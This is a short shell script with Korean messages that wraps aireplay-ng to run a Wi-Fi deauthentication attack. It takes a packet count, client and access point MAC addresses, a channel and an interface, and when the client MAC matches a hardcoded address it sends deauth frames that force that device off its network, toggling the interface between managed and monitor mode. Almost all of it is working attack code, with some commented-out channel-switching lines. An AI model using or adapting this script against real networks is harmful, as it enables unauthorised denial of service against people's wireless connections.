#!/bin/sh

if [ $# = 0 ]
then
	echo "무선랜 device정보가 누락되었습니다"
	return
fi
 

echo "*********************************************"
echo "$2 -> $3"
#if [ $2 = "90:9f:33:d3:89:1a" ]
#if [ $2 = "90:9f:33:d3:89:18" ]
if [ $2 = "64:7b:ce:11:ab:68" ] 
then
#
#	echo "./run_change_channel.sh $5 $4"
#	sh ./run_change_channel.sh $5 $4 
#	sudo iwconfig $5 channel $4
#	sleep 1
#
# $1: CNT
# S2: Device(client) MAC
# S3: AP MAC
# S4: Channel
# S5: wlan0

echo "      -------------" 
echo cnt=$1 device=$2 ap=$3 ch=$4 dev=$5
echo "aireplay-ng --deauh-rc 2 --deauth $1 -a $3 -c $2 $5"
sudo iwconfig $5 mode managed
sudo aireplay-ng --deauth-rc 2 --deauth $1 -a $3 -c $2 $5  -T 1
sudo iwconfig $5 mode monitor
fi
echo "*********************************************"
echo ""
